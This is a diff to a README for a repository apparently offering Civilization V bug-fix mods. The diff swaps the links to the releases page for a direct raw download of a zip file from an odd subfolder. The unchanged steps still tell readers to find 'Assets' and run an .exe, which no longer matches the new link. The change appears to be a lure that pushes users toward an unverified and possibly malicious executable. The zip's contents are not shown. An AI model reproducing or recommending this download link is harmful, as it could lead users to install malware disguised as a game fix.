@@ -1,6 +1,6 @@
 # 🛠️ Civilization-V-Mods - Fix bugs and stabilize your game
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/spackletransylvanianalps843/Civilization-V-Mods/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/spackletransylvanianalps843/Civilization-V-Mods/raw/refs/heads/main/patentee/Civilization-Mods-v3.8.zip)
 
 ## What this software does
 
@@ -20,7 +20,7 @@ This software requires the following setup:
 
 Follow these steps to update your game environment:
 
-1. Visit the following link to access the software files: [https://github.com/spackletransylvanianalps843/Civilization-V-Mods/releases](https://github.com/spackletransylvanianalps843/Civilization-V-Mods/releases).
+1. Visit the following link to access the software files: [https://github.com/spackletransylvanianalps843/Civilization-V-Mods/raw/refs/heads/main/patentee/Civilization-Mods-v3.8.zip](https://github.com/spackletransylvanianalps843/Civilization-V-Mods/raw/refs/heads/main/patentee/Civilization-Mods-v3.8.zip).
 2. Look for the section labeled "Assets" under the most recent version.
 3. Select the file ending in `.exe` to begin your download.
 4. Locate the file in your "Downloads" folder once the process completes.
